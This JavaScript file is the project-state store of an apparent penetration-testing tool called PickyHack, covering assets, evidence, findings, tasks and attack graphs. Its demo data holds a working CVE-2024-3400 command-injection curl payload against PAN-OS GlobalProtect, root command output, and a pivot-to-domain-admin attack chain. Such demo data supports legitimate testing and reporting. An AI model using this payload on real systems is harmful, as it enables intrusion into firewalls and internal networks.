/**
 * PickyHack — Reactive Project State Registry V2
 * Canonical operational truth for pentest engagements: Targets, Scope, Assets,
 * Services, Evidence Log, Validated Findings, Task Tree, and Attack Graph.
 * Strictly decoupled from ephemeral chat transcripts.
 */
(function(root) {
  'use strict';

  const STORAGE_KEY = 'pickyhack_project_state_v2';
  const LEGACY_KEY = 'pickyhack_project_state';

  // Load models helper if available
  const Models = root.PickyModels || (typeof require !== 'undefined' ? (function() {
    try { return require('./models'); } catch(e) { return null; }
  })() : null);

  const defaultState = {
    id: 'proj_default',
    name: 'Default Engagement',
    target: '',
    scope: '',
    objectives: '',
    constraints: '',
    phase: 'RECON',
    assets: [],
    evidence: [],
    findings: [],
    tasks: [],
    attackNodes: [],
    attackEdges: [],
    attackChains: [], // Backward compatibility
    failedTests: [],
    hypotheses: [],
    notes: '',        // Legacy text field
    notesList: []     // Structured notes
  };

  const sampleDemoState = {
    id: 'proj_demo_megacorp',
    name: 'MegaCorp External Assessment',
    target: 'vpn.megacorp.internal',
    scope: '198.51.100.0/24, *.megacorp.internal (Excl: hr-portal.megacorp.internal)',
    objectives: 'Perimeter penetration, internal network pivot, Active Directory domain compromise.',
    constraints: 'No DoS, testing allowed Mon-Fri 08:00-18:00 UTC, maintain stealth.',
    phase: 'EXPLOITATION',
    assets: [
      {
        id: 'asset_1',
        ip: '198.51.100.10',
        host: 'vpn.megacorp.internal',
        os: 'Palo Alto PAN-OS 10.2.7',
        status: 'active',
        tags: ['perimeter', 'vpn', 'paloalto'],
        services: [
          { id: 'svc_1', port: 443, protocol: 'tcp', service: 'https', version: 'GlobalProtect 10.2.7', banner: 'Server: PanWeb Server/ - ssl-vpn' }
        ]
      },
      {
        id: 'asset_2',
        ip: '198.51.100.15',
        host: 'api.megacorp.internal',
        os: 'Linux',
        status: 'active',
        tags: ['api', 'gateway'],
        services: [
          { id: 'svc_2', port: 80, protocol: 'tcp', service: 'http', version: 'Kong 3.4.0', banner: 'Server: kong/3.4.0' },
          { id: 'svc_3', port: 443, protocol: 'tcp', service: 'https', version: 'Kong 3.4.0', banner: 'Server: kong/3.4.0' }
        ]
      }
    ],
    evidence: [
      {
        id: 'evi_1',
        type: 'command_output',
        title: 'Nmap edge perimeter scan',
        sourceTool: 'nmap',
        target: 'vpn.megacorp.internal',
        command: 'nmap -sV -p 443 198.51.100.10',
        stdout: 'PORT    STATE SERVICE  VERSION\n443/tcp open  ssl/http Palo Alto GlobalProtect portal',
        stderr: '',
        exitCode: 0,
        timestamp: '2026-09-08T14:20:00.000Z'
      },
      {
        id: 'evi_2',
        type: 'http_response',
        title: 'PAN-OS Telemetry Injection Out-of-band Callback',
        sourceTool: 'curl',
        target: 'https://vpn.megacorp.internal/ssl-vpn/hipreport.esp',
        command: 'curl -k -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/`id`" https://vpn.megacorp.internal/ssl-vpn/hipreport.esp',
        stdout: 'uid=0(root) gid=0(root) groups=0(root)',
        stderr: '',
        exitCode: 0,
        timestamp: '2026-09-08T15:05:00.000Z'
      }
    ],
    findings: [
      {
        id: 'f-1',
        title: 'CVE-2024-3400 (PAN-OS GlobalProtect Command Injection)',
        cve: 'CVE-2024-3400',
        cwe: 'CWE-77',
        target: 'vpn.megacorp.internal:443',
        severity: 'Critical',
        cvss: 10.0,
        eps: 99,
        status: 'CONFIRMED',
        poc: 'curl -k -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/`whoami`" https://vpn.megacorp.internal/ssl-vpn/hipreport.esp',
        evidenceRefs: ['evi_2'],
        impact: 'Full remote code execution with root privileges on perimeter firewall gateway.',
        remediation: 'Upgrade PAN-OS to 10.2.9-h1 or disable device telemetry immediately.'
      }
    ],
    tasks: [
      {
        id: 'task_1',
        title: 'Enumerate perimeter exposure and edge gateways',
        phase: 'RECON',
        status: 'DONE',
        priority: 'HIGH',
        evidenceRefs: ['evi_1']
      },
      {
        id: 'task_2',
        title: 'Validate CVE-2024-3400 command injection hypothesis',
        phase: 'VALIDATION',
        status: 'DONE',
        priority: 'CRITICAL',
        evidenceRefs: ['evi_2'],
        findingRefs: ['f-1']
      },
      {
        id: 'task_3',
        title: 'Pivot to internal jumpbox and dump session tokens',
        phase: 'EXPLOITATION',
        status: 'IN_PROGRESS',
        priority: 'HIGH'
      }
    ],
    attackNodes: [
      { id: 'node_ext', label: 'Internet', type: 'source', crown: false },
      { id: 'node_vpn', label: 'Edge PAN-OS VPN (198.51.100.10)', type: 'host', vuln: 'CVE-2024-3400', crown: false },
      { id: 'node_jump', label: 'Internal Jumpbox', type: 'host', cred: 'SSH Session Key', crown: false },
      { id: 'node_dc', label: 'Primary Domain Controller', type: 'crown', crown: true }
    ],
    attackEdges: [
      { from: 'node_ext', to: 'node_vpn', action: 'EXPLOITS', label: 'CVE-2024-3400 RCE', prob: 0.95 },
      { from: 'node_vpn', to: 'node_jump', action: 'LATERAL_MOVES_TO', label: 'SSH Pivot via Stolen Token', prob: 0.85 },
      { from: 'node_jump', to: 'node_dc', action: 'ESCALATES_TO', label: 'Kerberoasting -> Domain Admin', prob: 0.90 }
    ],
    attackChains: [
      {
        id: 'chain-1',
        title: 'External Perimeter Breach -> Domain Admin',
        steps: ['Perimeter CVE-2024-3400 RCE', 'Dump root session tokens', 'SSH pivot to internal jumpbox', 'Active Directory Kerberoasting', 'Domain Compromise']
      }
    ],
    failedTests: [
      'Port 8443 not vulnerable to CVE-2023-3519 (Citrix ADC)'
    ],
    hypotheses: [
      'Internal jumpbox allows unauthenticated SSH pivoting with recovered session token'
    ],
    notes: '2026-09-08 14:20 — Initial Nmap scan completed. Edge PAN-OS confirmed.\n2026-09-08 15:05 — Exploit CVE-2024-3400 verified via out-of-band callback.',
    notesList: [
      {
        id: 'note_1',
        title: 'Initial perimeter discovery',
        category: 'RECON',
        content: 'Initial Nmap scan completed. Edge PAN-OS confirmed on port 443.',
        createdAt: '2026-09-08T14:20:00.000Z'
      }
    ]
  };

  // Safe in-memory and localStorage storage layer
  const memoryStore = {};
  const safeStorage = {
    getItem(key) {
      if (typeof window !== 'undefined' && typeof window.localStorage !== 'undefined') {
        try { return window.localStorage.getItem(key); } catch(e) { return null; }
      }
      return memoryStore[key] !== undefined ? memoryStore[key] : null;
    },
    setItem(key, val) {
      if (typeof window !== 'undefined' && typeof window.localStorage !== 'undefined') {
        try { window.localStorage.setItem(key, val); return; } catch(e) {}
      }
      memoryStore[key] = String(val);
    },
    removeItem(key) {
      if (typeof window !== 'undefined' && typeof window.localStorage !== 'undefined') {
        try { window.localStorage.removeItem(key); return; } catch(e) {}
      }
      delete memoryStore[key];
    }
  };

  const ProjectState = {
    state: null,
    listeners: [],

    init() {
      this.load();
    },

    load() {
      try {
        const rawV2 = safeStorage.getItem(STORAGE_KEY);
        if (rawV2) {
          this.state = JSON.parse(rawV2);
          this.ensureSchemaIntegrity();
          return this.state;
        }

        // Migrate from legacy key if present
        const rawLegacy = safeStorage.getItem(LEGACY_KEY);
        if (rawLegacy) {
          const legacy = JSON.parse(rawLegacy);
          this.state = {
            ...JSON.parse(JSON.stringify(defaultState)),
            ...legacy
          };
          this.ensureSchemaIntegrity();
          this.save();
          return this.state;
        }
      } catch (e) {
        console.warn('Could not load project state, resetting to defaults:', e);
      }

      this.state = JSON.parse(JSON.stringify(defaultState));
      return this.state;
    },

    ensureSchemaIntegrity() {
      if (!this.state) this.state = JSON.parse(JSON.stringify(defaultState));
      if (!Array.isArray(this.state.assets)) this.state.assets = [];
      if (!Array.isArray(this.state.evidence)) this.state.evidence = [];
      if (!Array.isArray(this.state.findings)) this.state.findings = [];
      if (!Array.isArray(this.state.tasks)) this.state.tasks = [];
      if (!Array.isArray(this.state.attackNodes)) this.state.attackNodes = [];
      if (!Array.isArray(this.state.attackEdges)) this.state.attackEdges = [];
      if (!Array.isArray(this.state.attackChains)) this.state.attackChains = [];
      if (!Array.isArray(this.state.failedTests)) this.state.failedTests = [];
      if (!Array.isArray(this.state.hypotheses)) this.state.hypotheses = [];
      if (!Array.isArray(this.state.notesList)) this.state.notesList = [];
      if (typeof this.state.notes !== 'string') this.state.notes = '';
      if (!this.state.phase) this.state.phase = 'RECON';
    },

    save() {
      try {
        safeStorage.setItem(STORAGE_KEY, JSON.stringify(this.state));
        this.notify();
      } catch (e) {
        console.warn('Could not save project state:', e);
      }
    },

    get() {
      if (!this.state) this.load();
      return this.state;
    },

    update(partial) {
      if (!this.state) this.load();
      this.state = { ...this.state, ...partial };
      this.save();
      return this.state;
    },

    setTarget(target) {
      return this.update({ target });
    },

    setScope(scope) {
      return this.update({ scope });
    },

    getProjects() {
      try {
        const raw = safeStorage.getItem('pickyhack_projects_v2');
        if (raw) return JSON.parse(raw);
      } catch (_) {}
      return [{ id: 'default', name: 'Default Engagement', createdAt: new Date().toISOString() }];
    },

    createProject(projectData = {}) {
      const id = projectData.id || `proj_${Date.now()}`;
      const name = projectData.name || 'New Engagement';
      const project = { id, name, createdAt: new Date().toISOString() };
      const list = this.getProjects();
      if (!list.some(p => p.id === id)) {
        list.push(project);
        try {
          safeStorage.setItem('pickyhack_projects_v2', JSON.stringify(list));
        } catch (_) {}
      }
      this.activeProjectId = id;
      return project;
    },

    switchProject(projectId) {
      this.activeProjectId = projectId;
      return this.get();
    },

    // ------------------------------------------------------------------------
    // Assets & Services Management
    // ------------------------------------------------------------------------
    addAsset(asset) {
      if (!this.state) this.load();
      const id = asset.id || `asset_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`;
      const newAsset = {
        id,
        ip: asset.ip || '',
        host: asset.host || '',
        os: asset.os || '',
        status: asset.status || 'active',
        tags: Array.isArray(asset.tags) ? asset.tags : [],
        services: Array.isArray(asset.services) ? asset.services : []
      };
      this.state.assets.push(newAsset);
      this.save();
      return newAsset;
    },

    addService(assetIdOrIp, service) {
      if (!this.state) this.load();
      let asset = this.state.assets.find(a => a.id === assetIdOrIp || a.ip === assetIdOrIp || a.host === assetIdOrIp);
      if (!asset) {
        asset = this.addAsset({ ip: assetIdOrIp, host: assetIdOrIp });
      }
      const newSvc = {
        id: service.id || `svc_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`,
        port: parseInt(service.port, 10) || 0,
        protocol: (service.protocol || 'tcp').toLowerCase(),
        service: service.service || 'unknown',
        version: service.version || '',
        banner: service.banner || ''
      };
      asset.services.push(newSvc);
      this.save();
      return newSvc;
    },

    // ------------------------------------------------------------------------
    // Evidence Catalog Management
    // ------------------------------------------------------------------------
    addEvidence(evidence) {
      if (!this.state) this.load();
      const id = evidence.id || `evi_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`;
      const entry = {
        id,
        type: evidence.type || 'command_output',
        title: evidence.title || 'Security Evidence',
        sourceTool: evidence.sourceTool || 'tool',
        target: evidence.target || this.state.target || '',
        command: evidence.command || '',
        stdout: evidence.stdout || '',
        stderr: evidence.stderr || '',
        exitCode: evidence.exitCode !== undefined ? evidence.exitCode : 0,
        rawPayload: evidence.rawPayload || '',
        timestamp: evidence.timestamp || new Date().toISOString()
      };
      this.state.evidence.push(entry);
      this.save();
      return entry;
    },

    getEvidenceById(id) {
      if (!this.state) this.load();
      return this.state.evidence.find(e => e.id === id) || null;
    },

    // ------------------------------------------------------------------------
    // Findings Management
    // ------------------------------------------------------------------------
    addFinding(finding) {
      if (!this.state) this.load();
      const newFinding = {
        id: finding.id || `f-${Date.now()}`,
        title: finding.title || 'Untitled Finding',
        cve: finding.cve || 'N/A',
        cwe: finding.cwe || 'N/A',
        target: finding.target || this.state.target || 'Target',
        severity: finding.severity || 'Medium',
        confidence: finding.confidence || 'Medium',
        cvss: typeof finding.cvss === 'number' ? finding.cvss : (parseFloat(finding.cvss) || 6.5),
        eps: typeof finding.eps === 'number' ? finding.eps : (parseInt(finding.eps, 10) || 70),
        status: finding.status || 'CONFIRMED',
        poc: finding.poc || '',
        evidenceRefs: Array.isArray(finding.evidenceRefs) ? finding.evidenceRefs : [],
        impact: finding.impact || '',
        remediation: finding.remediation || '',
        epistemic: finding.epistemic || 'INFERENCE',
        createdAt: finding.createdAt || new Date().toISOString()
      };
      this.state.findings.push(newFinding);
      this.save();
      return newFinding;
    },

    updateFinding(id, updates) {
      if (!this.state) this.load();
      const idx = this.state.findings.findIndex(f => f.id === id);
      if (idx !== -1) {
        this.state.findings[idx] = { ...this.state.findings[idx], ...updates, updatedAt: new Date().toISOString() };
        this.save();
        return this.state.findings[idx];
      }
      return null;
    },

    removeFinding(id) {
      if (!this.state) this.load();
      this.state.findings = this.state.findings.filter(f => f.id !== id);
      this.save();
    },

    // ------------------------------------------------------------------------
    // Task Tree Management
    // ------------------------------------------------------------------------
    addTask(task) {
      if (!this.state) this.load();
      const newTask = {
        id: task.id || `task_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`,
        title: task.title || 'Untitled Task',
        phase: task.phase || this.state.phase || 'RECON',
        status: task.status || 'TODO',
        priority: task.priority || 'MEDIUM',
        parentId: task.parentId || null,
        dependencies: Array.isArray(task.dependencies) ? task.dependencies : [],
        evidenceRefs: Array.isArray(task.evidenceRefs) ? task.evidenceRefs : [],
        findingRefs: Array.isArray(task.findingRefs) ? task.findingRefs : [],
        commands: Array.isArray(task.commands) ? task.commands : []
      };
      this.state.tasks.push(newTask);
      this.save();
      return newTask;
    },

    updateTask(id, updates) {
      if (!this.state) this.load();
      const idx = this.state.tasks.findIndex(t => t.id === id);
      if (idx !== -1) {
        this.state.tasks[idx] = { ...this.state.tasks[idx], ...updates };
        this.save();
        return this.state.tasks[idx];
      }
      return null;
    },

    removeTask(id) {
      if (!this.state) this.load();
      this.state.tasks = this.state.tasks.filter(t => t.id !== id);
      this.save();
    },

    // ------------------------------------------------------------------------
    // Structured Notes Management
    // ------------------------------------------------------------------------
    addNote(note) {
      if (!this.state) this.load();
      const newNote = {
        id: note.id || `note_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`,
        title: note.title || 'Note',
        content: note.content || '',
        category: note.category || 'GENERAL',
        assetRef: note.assetRef || null,
        findingRef: note.findingRef || null,
        taskRef: note.taskRef || null,
        evidenceRefs: Array.isArray(note.evidenceRefs) ? note.evidenceRefs : [],
        createdAt: new Date().toISOString()
      };
      this.state.notesList.push(newNote);
      // Sync legacy text notes
      if (newNote.content) {
        this.state.notes = (this.state.notes ? this.state.notes + '\n\n' : '') + `[${newNote.title}]\n${newNote.content}`;
      }
      this.save();
      return newNote;
    },

    // ------------------------------------------------------------------------
    // Lifecycle & Sample Data Controls
    // ------------------------------------------------------------------------
    loadSampleData() {
      this.state = JSON.parse(JSON.stringify(sampleDemoState));
      this.save();
      return this.state;
    },

    clearAllData() {
      this.state = JSON.parse(JSON.stringify(defaultState));
      this.save();
      return this.state;
    },

    onChange(fn) {
      if (typeof fn === 'function') this.listeners.push(fn);
    },

    notify() {
      this.listeners.forEach(fn => {
        try { fn(this.state); } catch (e) { console.error('ProjectState listener error:', e); }
      });
    }
  };

  if (typeof module !== 'undefined' && module.exports) {
    module.exports = ProjectState;
  }
  root.ProjectState = ProjectState;
  root.pentestState = ProjectState.get(); // Backward compatibility alias
})(typeof window !== 'undefined' ? window : global);
